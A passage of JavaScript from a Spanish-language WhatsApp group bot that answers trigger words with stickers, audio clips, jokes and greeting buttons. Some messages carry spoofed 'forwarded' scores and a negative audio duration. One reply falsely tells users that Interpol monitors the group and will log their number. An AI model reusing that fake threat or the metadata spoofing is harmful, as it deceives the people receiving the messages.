	if (budy.includes("puto bot")){
		if (isBaneado) return
			teslagod.updatePresence(from, Presence.composing)
			raewm = [
			result = fs.readFileSync(`./multimedia/misstks/sticker/rpt1.webp`),
			result1 = fs.readFileSync(`./multimedia/misstks/sticker/rpt2.webp`),
			result2 = fs.readFileSync(`./multimedia/misstks/sticker/rpt3.webp`),
			result3 = fs.readFileSync(`./multimedia/misstks/sticker/rpt4.webp`),
			result4 = fs.readFileSync(`./multimedia/misstks/sticker/rpt5.webp`),
			result5 = fs.readFileSync(`./multimedia/misstks/sticker/rpt6.webp`),
			result6 = fs.readFileSync(`./multimedia/misstks/sticker/rpt7.webp`),
			result7 = fs.readFileSync(`./multimedia/misstks/sticker/rpt8.webp`),
			result8 = fs.readFileSync(`./multimedia/misstks/sticker/rpt9.webp`),
			result9 = fs.readFileSync(`./multimedia/misstks/sticker/rpt10.webp`),
			result10 = fs.readFileSync(`./multimedia/misstks/sticker/rpt11.webp`),
			result11 = fs.readFileSync(`./multimedia/misstks/sticker/rpt12.webp`),
			result12 = fs.readFileSync(`./multimedia/misstks/sticker/rpt13.webp`),
			result13 = fs.readFileSync(`./multimedia/misstks/sticker/rpt14.webp`),
			result14 = fs.readFileSync(`./multimedia/misstks/sticker/rpt15.webp`),
			result15 = fs.readFileSync(`./multimedia/misstks/sticker/rpt16.webp`),
			result16 = fs.readFileSync(`./multimedia/misstks/sticker/rpt17.webp`),
			result17 = fs.readFileSync(`./multimedia/misstks/sticker/rpt18.webp`),
			result18 = fs.readFileSync(`./multimedia/misstks/sticker/rpt19.webp`),
			result19 = fs.readFileSync(`./multimedia/misstks/sticker/rpt20.webp`),
			result20 = fs.readFileSync(`./multimedia/misstks/sticker/rpt21.webp`),
			result21 = fs.readFileSync(`./multimedia/misstks/sticker/rpt22.webp`),
			result22 = fs.readFileSync(`./multimedia/misstks/sticker/rpt23.webp`),
			result23 = fs.readFileSync(`./multimedia/misstks/sticker/rpt24.webp`),
			result24 = fs.readFileSync(`./multimedia/misstks/sticker/rpt25.webp`),
			result25 = fs.readFileSync(`./multimedia/misstks/sticker/rpt26.webp`),
			result26 = fs.readFileSync(`./multimedia/misstks/sticker/rpt27.webp`),
			result27 = fs.readFileSync(`./multimedia/misstks/sticker/rpt28.webp`),
			result28 = fs.readFileSync(`./multimedia/misstks/sticker/rpt29.webp`),
			result29 = fs.readFileSync(`./multimedia/misstks/sticker/rpt30.webp`),
			result30 = fs.readFileSync(`./multimedia/misstks/sticker/rpt31.webp`),
			result31 = fs.readFileSync(`./multimedia/misstks/sticker/rpt32.webp`),
			result32 = fs.readFileSync(`./multimedia/misstks/sticker/rpt33.webp`),
			result33 = fs.readFileSync(`./multimedia/misstks/sticker/rpt34.webp`),
			result34 = fs.readFileSync(`./multimedia/misstks/sticker/rpt35.webp`),
			result35 = fs.readFileSync(`./multimedia/misstks/sticker/rpt36.webp`),
			result36 = fs.readFileSync(`./multimedia/misstks/sticker/rpt37.webp`),
			result37 = fs.readFileSync(`./multimedia/misstks/sticker/rpt38.webp`),
			result38 = fs.readFileSync(`./multimedia/misstks/sticker/rpt39.webp`),
			result39 = fs.readFileSync(`./multimedia/misstks/sticker/rpt40.webp`),
			result40 = fs.readFileSync(`./multimedia/misstks/sticker/rpt41.webp`),
			result41 = fs.readFileSync(`./multimedia/misstks/sticker/rpt42.webp`),
			result42 = fs.readFileSync(`./multimedia/misstks/sticker/rpt43.webp`),
			result43 = fs.readFileSync(`./multimedia/misstks/sticker/rpt44.webp`),
			result44 = fs.readFileSync(`./multimedia/misstks/sticker/rpt45.webp`),
			result45 = fs.readFileSync(`./multimedia/misstks/sticker/rpt46.webp`),
			result46 = fs.readFileSync(`./multimedia/misstks/sticker/rpt47.webp`),
			result47 = fs.readFileSync(`./multimedia/misstks/sticker/rpt48.webp`),
			result48 = fs.readFileSync(`./multimedia/misstks/sticker/rpt49.webp`),
			result49 = fs.readFileSync(`./multimedia/misstks/sticker/rpt50.webp`),
			result50 = fs.readFileSync(`./multimedia/misstks/sticker/rpt51.webp`),
			result51 = fs.readFileSync(`./multimedia/misstks/sticker/rpt52.webp`),
			result52 = fs.readFileSync(`./multimedia/misstks/sticker/rpt53.webp`),
			result53 = fs.readFileSync(`./multimedia/misstks/sticker/rpt54.webp`),
			result54 = fs.readFileSync(`./multimedia/misstks/sticker/rpt55.webp`),
			result55 = fs.readFileSync(`./multimedia/misstks/sticker/rpt56.webp`),
			result56 = fs.readFileSync(`./multimedia/misstks/sticker/rpt57.webp`),
			result57 = fs.readFileSync(`./multimedia/misstks/sticker/rpt58.webp`),
			result58 = fs.readFileSync(`./multimedia/misstks/sticker/rpt59.webp`),
			result59 = fs.readFileSync(`./multimedia/misstks/sticker/rpt60.webp`),
			result60 = fs.readFileSync(`./multimedia/misstks/sticker/rpt61.webp`),
			result61 = fs.readFileSync(`./multimedia/misstks/sticker/rpt62.webp`),
			result62 = fs.readFileSync(`./multimedia/misstks/sticker/rpt63.webp`),
			result63 = fs.readFileSync(`./multimedia/misstks/sticker/rpt64.webp`),
			result64 = fs.readFileSync(`./multimedia/misstks/sticker/rpt65.webp`),
			result65 = fs.readFileSync(`./multimedia/misstks/sticker/rpt66.webp`),
			result66 = fs.readFileSync(`./multimedia/misstks/sticker/rpt67.webp`),
			result67 = fs.readFileSync(`./multimedia/misstks/sticker/rpt68.webp`),
			result68 = fs.readFileSync(`./multimedia/misstks/sticker/rpt69.webp`),
			result69 = fs.readFileSync(`./multimedia/misstks/sticker/rpt70.webp`),
			result70 = fs.readFileSync(`./multimedia/misstks/sticker/rpt71.webp`),
			result71 = fs.readFileSync(`./multimedia/misstks/sticker/rpt72.webp`),
			result72 = fs.readFileSync(`./multimedia/misstks/sticker/rpt73.webp`),
			result73 = fs.readFileSync(`./multimedia/misstks/sticker/rpt74.webp`),
			result74 = fs.readFileSync(`./multimedia/misstks/sticker/rpt75.webp`),
			result75 = fs.readFileSync(`./multimedia/misstks/sticker/rpt76.webp`),
			result76 = fs.readFileSync(`./multimedia/misstks/sticker/rpt77.webp`)
			]
			nikk = raewm[Math.floor(Math.random() * raewm.length)]
  			teslagod.sendMessage(from, nikk, sticker, {
			quoted: rptardidos, "forwardingScore": 9999, "isForwarded": true
  			})
			}

if (budy.includes("bot puto")){
	if (isBaneado) return
			teslagod.updatePresence(from, Presence.composing)
			rraewm = [
			result = fs.readFileSync(`./multimedia/misstks/sticker/rpt1.webp`),
			result1 = fs.readFileSync(`./multimedia/misstks/sticker/rpt2.webp`),
			result2 = fs.readFileSync(`./multimedia/misstks/sticker/rpt3.webp`),
			result3 = fs.readFileSync(`./multimedia/misstks/sticker/rpt4.webp`),
			result4 = fs.readFileSync(`./multimedia/misstks/sticker/rpt5.webp`),
			result5 = fs.readFileSync(`./multimedia/misstks/sticker/rpt6.webp`),
			result6 = fs.readFileSync(`./multimedia/misstks/sticker/rpt7.webp`),
			result7 = fs.readFileSync(`./multimedia/misstks/sticker/rpt8.webp`),
			result8 = fs.readFileSync(`./multimedia/misstks/sticker/rpt9.webp`),
			result9 = fs.readFileSync(`./multimedia/misstks/sticker/rpt10.webp`),
			result10 = fs.readFileSync(`./multimedia/misstks/sticker/rpt11.webp`),
			result11 = fs.readFileSync(`./multimedia/misstks/sticker/rpt12.webp`),
			result12 = fs.readFileSync(`./multimedia/misstks/sticker/rpt13.webp`),
			result13 = fs.readFileSync(`./multimedia/misstks/sticker/rpt14.webp`),
			result14 = fs.readFileSync(`./multimedia/misstks/sticker/rpt15.webp`),
			result15 = fs.readFileSync(`./multimedia/misstks/sticker/rpt16.webp`),
			result16 = fs.readFileSync(`./multimedia/misstks/sticker/rpt17.webp`),
			result17 = fs.readFileSync(`./multimedia/misstks/sticker/rpt18.webp`),
			result18 = fs.readFileSync(`./multimedia/misstks/sticker/rpt19.webp`),
			result19 = fs.readFileSync(`./multimedia/misstks/sticker/rpt20.webp`),
			result20 = fs.readFileSync(`./multimedia/misstks/sticker/rpt21.webp`),
			result21 = fs.readFileSync(`./multimedia/misstks/sticker/rpt22.webp`),
			result22 = fs.readFileSync(`./multimedia/misstks/sticker/rpt23.webp`),
			result23 = fs.readFileSync(`./multimedia/misstks/sticker/rpt24.webp`),
			result24 = fs.readFileSync(`./multimedia/misstks/sticker/rpt25.webp`),
			result25 = fs.readFileSync(`./multimedia/misstks/sticker/rpt26.webp`),
			result26 = fs.readFileSync(`./multimedia/misstks/sticker/rpt27.webp`),
			result27 = fs.readFileSync(`./multimedia/misstks/sticker/rpt28.webp`),
			result28 = fs.readFileSync(`./multimedia/misstks/sticker/rpt29.webp`),
			result29 = fs.readFileSync(`./multimedia/misstks/sticker/rpt30.webp`),
			result30 = fs.readFileSync(`./multimedia/misstks/sticker/rpt31.webp`),
			result31 = fs.readFileSync(`./multimedia/misstks/sticker/rpt32.webp`),
			result32 = fs.readFileSync(`./multimedia/misstks/sticker/rpt33.webp`),
			result33 = fs.readFileSync(`./multimedia/misstks/sticker/rpt34.webp`),
			result34 = fs.readFileSync(`./multimedia/misstks/sticker/rpt35.webp`),
			result35 = fs.readFileSync(`./multimedia/misstks/sticker/rpt36.webp`),
			result36 = fs.readFileSync(`./multimedia/misstks/sticker/rpt37.webp`),
			result37 = fs.readFileSync(`./multimedia/misstks/sticker/rpt38.webp`),
			result38 = fs.readFileSync(`./multimedia/misstks/sticker/rpt39.webp`),
			result39 = fs.readFileSync(`./multimedia/misstks/sticker/rpt40.webp`),
			result40 = fs.readFileSync(`./multimedia/misstks/sticker/rpt41.webp`),
			result41 = fs.readFileSync(`./multimedia/misstks/sticker/rpt42.webp`),
			result42 = fs.readFileSync(`./multimedia/misstks/sticker/rpt43.webp`),
			result43 = fs.readFileSync(`./multimedia/misstks/sticker/rpt44.webp`),
			result44 = fs.readFileSync(`./multimedia/misstks/sticker/rpt45.webp`),
			result45 = fs.readFileSync(`./multimedia/misstks/sticker/rpt46.webp`),
			result46 = fs.readFileSync(`./multimedia/misstks/sticker/rpt47.webp`),
			result47 = fs.readFileSync(`./multimedia/misstks/sticker/rpt48.webp`),
			result48 = fs.readFileSync(`./multimedia/misstks/sticker/rpt49.webp`),
			result49 = fs.readFileSync(`./multimedia/misstks/sticker/rpt50.webp`),
			result50 = fs.readFileSync(`./multimedia/misstks/sticker/rpt51.webp`),
			result51 = fs.readFileSync(`./multimedia/misstks/sticker/rpt52.webp`),
			result52 = fs.readFileSync(`./multimedia/misstks/sticker/rpt53.webp`),
			result53 = fs.readFileSync(`./multimedia/misstks/sticker/rpt54.webp`),
			result54 = fs.readFileSync(`./multimedia/misstks/sticker/rpt55.webp`),
			result55 = fs.readFileSync(`./multimedia/misstks/sticker/rpt56.webp`),
			result56 = fs.readFileSync(`./multimedia/misstks/sticker/rpt57.webp`),
			result57 = fs.readFileSync(`./multimedia/misstks/sticker/rpt58.webp`),
			result58 = fs.readFileSync(`./multimedia/misstks/sticker/rpt59.webp`),
			result59 = fs.readFileSync(`./multimedia/misstks/sticker/rpt60.webp`),
			result60 = fs.readFileSync(`./multimedia/misstks/sticker/rpt61.webp`),
			result61 = fs.readFileSync(`./multimedia/misstks/sticker/rpt62.webp`),
			result62 = fs.readFileSync(`./multimedia/misstks/sticker/rpt63.webp`),
			result63 = fs.readFileSync(`./multimedia/misstks/sticker/rpt64.webp`),
			result64 = fs.readFileSync(`./multimedia/misstks/sticker/rpt65.webp`),
			result65 = fs.readFileSync(`./multimedia/misstks/sticker/rpt66.webp`),
			result66 = fs.readFileSync(`./multimedia/misstks/sticker/rpt67.webp`),
			result67 = fs.readFileSync(`./multimedia/misstks/sticker/rpt68.webp`),
			result68 = fs.readFileSync(`./multimedia/misstks/sticker/rpt69.webp`),
			result69 = fs.readFileSync(`./multimedia/misstks/sticker/rpt70.webp`),
			result70 = fs.readFileSync(`./multimedia/misstks/sticker/rpt71.webp`),
			result71 = fs.readFileSync(`./multimedia/misstks/sticker/rpt72.webp`),
			result72 = fs.readFileSync(`./multimedia/misstks/sticker/rpt73.webp`),
			result73 = fs.readFileSync(`./multimedia/misstks/sticker/rpt74.webp`),
			result74 = fs.readFileSync(`./multimedia/misstks/sticker/rpt75.webp`),
			result75 = fs.readFileSync(`./multimedia/misstks/sticker/rpt76.webp`),
			result76 = fs.readFileSync(`./multimedia/misstks/sticker/rpt77.webp`)
			]
			nikok = rraewm[Math.floor(Math.random() * rraewm.length)]
  			teslagod.sendMessage(from, nikok, sticker, {
			quoted: rptardidos, "forwardingScore": 9999, "isForwarded": true
  			})
			}
////xd////
if (budy.includes("gracias bot")){
	if (isBaneado) return
			teslagod.updatePresence(from, Presence.composing)
			reply(`${pushname} pa servirle mi king`)
			}
if (budy.includes("bot gracias")){
	if (isBaneado) return
			teslagod.updatePresence(from, Presence.composing)
			reply(`${pushname} pa servirle mi king`)
			}
if (budy.includes("te amo bot")){
	if (isBaneado) return
			teslagod.updatePresence(from, Presence.composing)
			setTimeout( () => {
			reply(`*Hmmm...*`)
			}, 0)
			rm = [
			result = fs.readFileSync(`./multimedia/misstks/sticker/love1.webp`),
			result1 = fs.readFileSync(`./multimedia/misstks/sticker/love6.webp`),
			result2 = fs.readFileSync(`./multimedia/misstks/sticker/love2.webp`),
			result3 = fs.readFileSync(`./multimedia/misstks/sticker/love3.webp`),
			result4 = fs.readFileSync(`./multimedia/misstks/sticker/love4.webp`),
			result5 = fs.readFileSync(`./multimedia/misstks/sticker/love5.webp`)
			]
			nk = rm[Math.floor(Math.random() * rm.length)]
			setTimeout( () => {
  		  teslagod.sendMessage(from, nk, sticker, {quoted: mek, "forwardingScore": 51995386439, "isForwarded": true})
            }, 100)
			setTimeout( () => {
			reply(`*No c que decir, ya que soy un bot programado >\\<*`)
			}, 3000)
			setTimeout( () => {
			reply(`${pushname} *<3*`)
			}, 3300)
			}
if (budy.includes("bot te amo")){
	if (isBaneado) return
			teslagod.updatePresence(from, Presence.composing)
			setTimeout( () => {
			reply(`*Hmmm...*`)
			}, 0)
			rm = [
			result = fs.readFileSync(`./multimedia/misstks/sticker/love1.webp`),
			result1 = fs.readFileSync(`./multimedia/misstks/sticker/love6.webp`),
			result2 = fs.readFileSync(`./multimedia/misstks/sticker/love2.webp`),
			result3 = fs.readFileSync(`./multimedia/misstks/sticker/love3.webp`),
			result4 = fs.readFileSync(`./multimedia/misstks/sticker/love4.webp`),
			result5 = fs.readFileSync(`./multimedia/misstks/sticker/love5.webp`)
			]
			nk = rm[Math.floor(Math.random() * rm.length)]
			setTimeout( () => {
  		  teslagod.sendMessage(from, nk, sticker, {quoted: mek, "forwardingScore": 51995386439, "isForwarded": true})
            }, 100)
			setTimeout( () => {
			reply(`*No c que decir, ya que soy un bot programado >\\<*`)
			}, 3000)
			setTimeout( () => {
			reply(`${pushname} *<3*`)
			}, 3300)
			}
//cringe moment
if (automensajesxd.includes("uwu")){
	if (isBaneado) return
			teslagod.updatePresence(from, Presence.composing)
			rom = [
			result1 = fs.readFileSync(`./multimedia/misstks/sticker/cringe1.webp`),
			result2 = fs.readFileSync(`./multimedia/misstks/sticker/cringe2.webp`),
			result3 = fs.readFileSync(`./multimedia/misstks/sticker/cringe3.webp`),
			result4 = fs.readFileSync(`./multimedia/misstks/sticker/cringe4.webp`),
			result5 = fs.readFileSync(`./multimedia/misstks/sticker/cringe5.webp`)
			]
			nkosmo = rom[Math.floor(Math.random() * rom.length)]
  			teslagod.sendMessage(from, nkosmo, sticker, {
			quoted: mek, contextInfo:{externalAdReply: {title: `${pushname} UwU`, body: '', sourceUrl: 'https://vm.tiktok.com/ZM8roHuVA/', thumbnail: fs.readFileSync('./multimedia/imagenes/milogohd.jpg')}}})
			}
if (automensajesxd.includes("owo")){
	if (isBaneado) return
			teslagod.updatePresence(from, Presence.composing)
			result = fs.readFileSync(`./multimedia/misstks/sticker/owobot.webp`)
  teslagod.sendMessage(from, result, sticker, {
quoted: mek, contextInfo:{externalAdReply: {title: `${pushname} OwO`, body: '', sourceUrl: 'https://vm.tiktok.com/ZM8h1BVrk/', thumbnail: fs.readFileSync('./multimedia/imagenes/milogohd.jpg')}}})
	}
if (automensajesxd.includes("awa ")){
	if (isBaneado) return
			teslagod.updatePresence(from, Presence.composing)
			result = fs.readFileSync(`./multimedia/misstks/sticker/awabot.webp`)
  teslagod.sendMessage(from, result, sticker, {
quoted: mek, contextInfo:{externalAdReply: {title: `${pushname} AwA`, body: '', sourceUrl: 'https://vm.tiktok.com/ZM8h1jksC/', thumbnail: fs.readFileSync('./multimedia/imagenes/milogohd.jpg')}}})
	}
if (automensajesxd.includes("ewe")){
	if (isBaneado) return
			teslagod.updatePresence(from, Presence.composing)
			result = fs.readFileSync(`./multimedia/misstks/sticker/ewebot.webp`)
  teslagod.sendMessage(from, result, sticker, {
quoted: mek, contextInfo:{externalAdReply: {title: `${pushname} ewe`, body: '', sourceUrl: 'https://vm.tiktok.com/ZM8h1aQhG/', thumbnail: fs.readFileSync('./multimedia/imagenes/milogohd.jpg')}}})
	}
if (automensajesxd.includes("unu")){
	if (isBaneado) return
			teslagod.updatePresence(from, Presence.composing)
			result = fs.readFileSync(`./multimedia/misstks/sticker/unubot.webp`)
  teslagod.sendMessage(from, result, sticker, {
quoted: mek, contextInfo:{externalAdReply: {title: `${pushname} UnU`, body: '', sourceUrl: 'https://vm.tiktok.com/ZM8h1MDuL/', thumbnail: fs.readFileSync('./multimedia/imagenes/milogohd.jpg')}}})
	}
if (automensajesxd.includes("7v7")){
	if (isBaneado) return
			teslagod.updatePresence(from, Presence.composing)
			result = fs.readFileSync(`./multimedia/misstks/sticker/7v7bot.webp`)
  teslagod.sendMessage(from, result, sticker, {
quoted: mek, contextInfo:{externalAdReply: {title: `${pushname} 7v7r`, body: '', sourceUrl: 'https://vm.tiktok.com/ZM8h1Y8h6/', thumbnail: fs.readFileSync('./multimedia/imagenes/milogohd.jpg')}}})
	}
if (automensajesxd.includes("7w7")){
	if (isBaneado) return
			teslagod.updatePresence(from, Presence.composing)
			result = fs.readFileSync(`./multimedia/misstks/sticker/7w7bot.webp`)
  teslagod.sendMessage(from, result, sticker, {
quoted: mek, contextInfo:{externalAdReply: {title: `${pushname} 7w7r`, body: '', sourceUrl: 'https://vm.tiktok.com/ZM8h1fmXx/', thumbnail: fs.readFileSync('./multimedia/imagenes/milogohd.jpg')}}})
	}
if (automensajesxd.includes("7u7")){
	if (isBaneado) return
			teslagod.updatePresence(from, Presence.composing)
			result = fs.readFileSync(`./multimedia/misstks/sticker/7u7bot.webp`)
  teslagod.sendMessage(from, result, sticker, {
quoted: mek, contextInfo:{externalAdReply: {title: `${pushname} 7u7r`, body: '', sourceUrl: 'https://vm.tiktok.com/ZM8h1MHD8/', thumbnail: fs.readFileSync('./multimedia/imagenes/milogohd.jpg')}}})
	}
//insultos fuertes :v
if (automensajesxd.includes("tonto")){
	if (isBaneado) return
			teslagod.updatePresence(from, Presence.composing)
			reply(`*ˢᵉ ᵈᵉᵗᵉᶜᵗᵒ ᵘⁿ ᶦⁿˢᵘˡᵗᵒ ᵐᵘʸ ᶠᵘᵉʳᵗᵉ*\n_*ᵀᵒⁿᵗᵒ*_`)
	}
if (automensajesxd.includes("bobo")){
	if (isBaneado) return
			teslagod.updatePresence(from, Presence.composing)
			reply(`*ˢᵉ ᵈᵉᵗᵉᶜᵗᵒ ᵘⁿ ᶦⁿˢᵘˡᵗᵒ ᵐᵘʸ ᶠᵘᵉʳᵗᵉ*\n_*ᴮᵒᵇᵒ*_`)
	}
if (automensajesxd.includes("papanatas")){
	if (isBaneado) return
			teslagod.updatePresence(from, Presence.composing)
			reply(`*ˢᵉ ᵈᵉᵗᵉᶜᵗᵒ ᵘⁿ ᶦⁿˢᵘˡᵗᵒ ᵐᵘʸ ᶠᵘᵉʳᵗᵉ*\n_*ᴾᵃᵖᵃⁿᵃᵗᵃˢ*_`)
	}
if (automensajesxd.includes("perseve")){
	if (isBaneado) return
			teslagod.updatePresence(from, Presence.composing)
			reply(`*ˢᵉ ᵈᵉᵗᵉᶜᵗᵒ ᵘⁿ ᶦⁿˢᵘˡᵗᵒ ᵐᵘʸ ᶠᵘᵉʳᵗᵉ*\n_*ᴾᵉʳˢᵉᵛᵉ* _`)
	}
if (automensajesxd.includes("pelele")){
	if (isBaneado) return
			teslagod.updatePresence(from, Presence.composing)
			reply(`*ˢᵉ ᵈᵉᵗᵉᶜᵗᵒ ᵘⁿ ᶦⁿˢᵘˡᵗᵒ ᵐᵘʸ ᶠᵘᵉʳᵗᵉ*\n_*ᴾᵉˡᵉˡᵉ*_`)
	}
if (automensajesxd.includes("pamplinas")){
	if (isBaneado) return
			teslagod.updatePresence(from, Presence.composing)
			reply(`*ˢᵉ ᵈᵉᵗᵉᶜᵗᵒ ᵘⁿ ᶦⁿˢᵘˡᵗᵒ ᵐᵘʸ ᶠᵘᵉʳᵗᵉ*\n_*ᴾᵃᵐᵖˡᶦⁿᵃˢ*_`)
	}
if (automensajesxd.includes("chispas")){
	if (isBaneado) return
			teslagod.updatePresence(from, Presence.composing)
			reply(`*ˢᵉ ᵈᵉᵗᵉᶜᵗᵒ ᵘⁿ ᶦⁿˢᵘˡᵗᵒ ᵐᵘʸ ᶠᵘᵉʳᵗᵉ*\n_*ᶜʰᶦˢᵖᵃˢ*_`)
	}
//antienfermos
	if (budy.includes("pasen porno")){
		if (isBaneado) return
			teslagod.updatePresence(from, Presence.composing)
			reply(`https://www.interpol.int 𝙸𝚗𝚝𝚎𝚛𝚙𝚘𝚕 𝚖𝚘𝚗𝚒𝚝𝚘𝚛𝚎𝚊 𝚕𝚘𝚜 𝚐𝚛𝚞𝚙𝚘𝚜 𝚍𝚎 𝚠𝚑𝚊𝚝𝚜𝚊𝚙𝚙 ${pushname}️ , 𝙿𝚘𝚛 𝚛𝚊𝚣𝚘𝚗𝚎𝚜 𝚍?? 𝚜𝚎𝚐𝚞𝚛𝚒𝚍𝚊𝚍 𝚝𝚞 𝚗𝚞𝚖𝚎𝚛𝚘 𝚜𝚎𝚛𝚊 𝚊𝚐𝚎𝚗𝚍𝚊𝚍𝚘 𝚎𝚗 𝚕𝚊 *Database* `)
	}
	if (budy.includes("pasen xxx")){
		if (isBaneado) return
			teslagod.updatePresence(from, Presence.composing)
			reply(`https://www.interpol.int 𝙸𝚗𝚝𝚎𝚛𝚙𝚘𝚕 𝚖𝚘𝚗𝚒𝚝𝚘𝚛𝚎𝚊 𝚕𝚘𝚜 𝚐𝚛𝚞𝚙𝚘𝚜 𝚍𝚎 𝚠𝚑𝚊𝚝𝚜𝚊𝚙𝚙 ${pushname}️ , 𝙿𝚘𝚛 𝚛𝚊𝚣𝚘𝚗𝚎𝚜 𝚍𝚎 𝚜𝚎𝚐𝚞𝚛𝚒𝚍𝚊𝚍 𝚝𝚞 𝚗𝚞𝚖𝚎𝚛𝚘 𝚜𝚎𝚛𝚊 𝚊𝚐𝚎𝚗𝚍𝚊𝚍𝚘 𝚎𝚗 𝚕𝚊 *Database* `)
	}
//autorrespuesta multimedia
if (automensajesxd.includes("papu")){
	if (isBaneado) return
			teslagod.updatePresence(from, Presence.composing)
			wlcda = fs.readFileSync('./multimedia/sonidos/audishitxd/papus.m4a');
            teslagod.sendMessage(from, wlcda, MessageType.audio, {quoted: audiowor, mimetype: 'audio/mp4', ptt:true})
            ressult = fs.readFileSync(`./multimedia/misstks/sticker/papudance.webp`)
            teslagod.sendMessage(from, ressult, sticker, {quoted: mek})
	}
if (automensajesxd.includes("kawai")){
	if (isBaneado) return
			teslagod.updatePresence(from, Presence.composing)
			audioxdc = fs.readFileSync('./multimedia/sonidos/audiouwu/onichan.mp3');
            teslagod.sendMessage(from, audioxdc, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
	}
if (budy.includes("yamete")){
	if (isBaneado) return
			teslagod.updatePresence(from, Presence.composing)
			audioxdc = fs.readFileSync('./multimedia/sonidos/audiouwu/yamete.mp3');
            teslagod.sendMessage(from, audioxdc, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
	}
if (automensajesxd.includes("baka")){
	if (isBaneado) return
			teslagod.updatePresence(from, Presence.composing)
			audioxdc = fs.readFileSync('./multimedia/sonidos/audiouwu/baka.mp3');
            teslagod.sendMessage(from, audioxdc, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
	}
if (budy.includes("ara ara")){
	if (isBaneado) return
			teslagod.updatePresence(from, Presence.composing)
			audioxdc = fs.readFileSync('./multimedia/sonidos/audiouwu/araara.mp3');
            teslagod.sendMessage(from, audioxdc, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
	}
if (automensajesxd.includes("onich")){
	if (isBaneado) return
			teslagod.updatePresence(from, Presence.composing)
			tujuh = fs.readFileSync('./multimedia/sonidos/audiouwu/onich.mp3');
            teslagod.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
	}
if (automensajesxd.includes("kudasai")){
	if (isBaneado) return
			teslagod.updatePresence(from, Presence.composing)
			tujuh = fs.readFileSync('./multimedia/sonidos/audiouwu/ya.mp3');
            teslagod.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
	}
if (budy.includes("ª")){
	if (isBaneado) return
			teslagod.updatePresence(from, Presence.composing)
			audioxdc = fs.readFileSync('./multimedia/sonidos/audishitxd/aaa.m4a')
            teslagod.sendMessage(from, audioxdc, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration :-51995386439, ptt:true})
	}
////zzz
if (automensajesxd.includes("tesla")){
	if (isBaneado) return
			teslagod.updatePresence(from, Presence.composing) 
	     	const d = fs.readFileSync('./multimedia/misstks/sticker/teslagod.webp');
            teslagod.sendMessage(from, d, sticker, {quoted: mek})
    }
//comienzo de la magia xd
if (!autonomo && !Matt_M && !isTeslaUser && NK_Tesla === true) return
switch(rtpuwu) {				
case 'hola':
case 'holi':
case 'hol':
case 'Hola':
case 'Holi':
case 'Hol':
if (isBaneado) return
if (OnOffLine === false) return
const offline1 =[`ℍolaaaa ${pushname} \n¿Como estas mi destinguido amig@? ≧ω≦ :_`, `ℍolaaaa ${pushname} \n¿Como estas mi Excelentísimo amig@? ≧ω≦ :_`,`ℍolaaaaa ${pushname} \n¿Como estas mi Apreciado amig@? ≧ω≦ :_ `, `ℍolaa ${pushname} \n¿Como estas mi Honorable amig@? ≧ω≦ :_ `, `ℍolaaa ${pushname} \n¿Como estas mi Estimado amig@? ≧ω≦ :_ `, `ℍolaaaaa ${pushname} \n¿Como estas wap@? ≧ω≦ :_ `, `ℍolaaaaaa ${pushname} \n¿Como estas mi king? ≧ω≦ :_`, `ℍolaaa ${pushname} \n¿Como estas mi rey ≧ω≦ :_ `, `ℍolaa ${pushname} \n¿Como estas mi querido amig@? ≧ω≦ :_`, `ℍolaaa ${pushname} \n¿Como estas? ≧ω≦ :_`,`ℍolaa ${pushname} \n¿Que tal mi destinguido amig@? ≧ω≦ :_`, `ℍolaaaaa ${pushname} \n¿Que tal mi Excelentísimo amig@? ≧ω≦ :_`,`ℍolaaaa ${pushname} \n¿Que tal mi Apreciado amig@? ≧ω≦ :_`, `ℍolaaaaa ${pushname} \n¿Que tal mi Honorable amig@? ≧ω≦ :_`, `ℍolaaaa ${pushname} \n¿Que tal mi Estimado amig@? ≧ω≦ :_`, `ℍolaaaaa ${pushname} \n¿Que tal wap@? ≧ω≦ :_`, `ℍolaa ${pushname} \n¿Que tal mi king? ≧ω≦ :_`, `ℍolaa ${pushname} \n¿Que tal mi rey ≧ω≦ :_`, `ℍolaaa ${pushname} \n¿Que tal mi querido amig@? ≧ω≦ :_`, `ℍolaa ${pushname} \n¿Que tal como estas? ≧ω≦ :_`]
const cringe = offline1[Math.floor(Math.random() * (offline1.length))]
sendButMessage(from, `\n${cringe}`, `Matt_M ✓`,[{buttonId: `${prefix}rpt51995386439yep`,buttonText: {displayText: `Bien 😁`,},type: 1,},{buttonId: `${prefix}rpt51995386439sow`,buttonText: {displayText: `Masomenos 😔`,},type: 1,},{buttonId: `${prefix}rpt51995386439sad`,buttonText: {displayText: `Mal 😢`,},type: 1,},])
break
case 'buenas':
case 'Buenas':
if (isBaneado) return
if (OnOffLine === false) return
const offline3 =[`𝔹uenasss ${pushname} \n¿Como estas mi destinguido amig@? ≧ω≦ :_`, `𝔹uenasss ${pushname} \n¿Como estas mi Excelentísimo amig@? ≧ω≦ :_`,`𝔹uenasssa ${pushname} \n¿Como estas mi Apreciado amig@? ≧ω≦ :_`, `𝔹uenasss ${pushname} \n¿Como estas mi Honorable amig@? ≧ω≦ :_`, `𝔹uenasss ${pushname} \n¿Como estas mi Estimado amig@? ≧ω≦ :_`, `𝔹uenasss ${pushname} \n¿Como estas wap@? ≧ω≦ :_`, `𝔹uenasss ${pushname} \n¿Como estas mi king? ≧ω≦ :_`, `𝔹uenasss ${pushname} \n¿Como estas mi rey ≧ω≦ :_`, `𝔹uenasss ${pushname} \n¿Como estas mi querido amig@? ≧ω≦ :_`, `𝔹uenasss ${pushname} \n¿Como estas? ≧ω≦ :_`, `𝔹uenasss ${pushname} \n¿Que tal mi destinguido amig@? ≧ω≦ :_`, `𝔹uenasss ${pushname} \n¿Que tal mi Excelentísimo amig@? ≧ω≦ :_`,`𝔹uenasss ${pushname} \n¿Que tal mi Apreciado amig@? ≧ω≦ :_`, `𝔹uenasss ${pushname} \n¿Que tal mi Honorable amig@? ≧ω≦ :_`, `𝔹uenasss ${pushname} \n¿Que tal mi Estimado amig@? ≧ω≦ :_`, `𝔹uenasss ${pushname} \n¿Que tal wap@? ≧ω≦ :_`, `𝔹uenasss ${pushname} \n¿Que tal mi king? ≧ω≦ :_`, `𝔹uenasss ${pushname} 